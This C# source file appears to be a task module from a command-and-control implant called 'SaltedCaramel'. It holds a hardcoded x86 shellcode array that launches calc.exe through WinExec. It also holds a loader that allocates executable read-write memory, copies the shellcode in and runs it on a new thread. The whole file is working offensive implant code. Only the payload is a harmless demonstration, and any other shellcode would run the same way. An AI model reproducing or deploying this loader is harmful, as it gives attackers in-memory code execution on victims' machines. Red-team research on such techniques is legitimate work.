﻿using System;
using System.Runtime.InteropServices;

namespace SaltedCaramel.Tasks
{
    public class Shellcode
    {
        public static void Execute(SCTask task, SCImplant implant)
        {
            byte[] shellcode = new byte[] {
                0x50,0x53,0x51,0x52,0x56,0x57,0x55,0x89,
                0xe5,0x83,0xec,0x18,0x31,0xf6,0x56,0x6a,
                0x63,0x66,0x68,0x78,0x65,0x68,0x57,0x69,
                0x6e,0x45,0x89,0x65,0xfc,0x31,0xf6,0x64,
                0x8b,0x5e,0x30,0x8b,0x5b,0x0c,0x8b,0x5b,
                0x14,0x8b,0x1b,0x8b,0x1b,0x8b,0x5b,0x10,
                0x89,0x5d,0xf8,0x31,0xc0,0x8b,0x43,0x3c,
                0x01,0xd8,0x8b,0x40,0x78,0x01,0xd8,0x8b,
                0x48,0x24,0x01,0xd9,0x89,0x4d,0xf4,0x8b,
                0x78,0x20,0x01,0xdf,0x89,0x7d,0xf0,0x8b,
                0x50,0x1c,0x01,0xda,0x89,0x55,0xec,0x8b,
                0x58,0x14,0x31,0xc0,0x8b,0x55,0xf8,0x8b,
                0x7d,0xf0,0x8b,0x75,0xfc,0x31,0xc9,0xfc,
                0x8b,0x3c,0x87,0x01,0xd7,0x66,0x83,0xc1,
                0x08,0xf3,0xa6,0x74,0x0a,0x40,0x39,0xd8,
                0x72,0xe5,0x83,0xc4,0x26,0xeb,0x41,0x8b,
                0x4d,0xf4,0x89,0xd3,0x8b,0x55,0xec,0x66,
                0x8b,0x04,0x41,0x8b,0x04,0x82,0x01,0xd8,
                0x31,0xd2,0x52,0x68,0x2e,0x65,0x78,0x65,
                0x68,0x63,0x61,0x6c,0x63,0x68,0x6d,0x33,
                0x32,0x5c,0x68,0x79,0x73,0x74,0x65,0x68,
                0x77,0x73,0x5c,0x53,0x68,0x69,0x6e,0x64,
                0x6f,0x68,0x43,0x3a,0x5c,0x57,0x89,0xe6,
                0x6a,0x0a,0x56,0xff,0xd0,0x83,0xc4,0x46,
                0x5d,0x5f,0x5e,0x5a,0x59,0x5b,0x58,0xc3
            };
            IntPtr procHandle = IntPtr.Zero;
            uint lpAddress = 0;
            uint dwSize = (uint)shellcode.Length;

            IntPtr buffer = Win32.Kernel32.VirtualAlloc(lpAddress, dwSize, Win32.Kernel32.AllocationType.Commit | Win32.Kernel32.AllocationType.Reserve, Win32.Kernel32.MemoryProtection.ExecuteReadWrite);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint threadId = 0;
            IntPtr hThread = Win32.Kernel32.CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);

            Win32.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
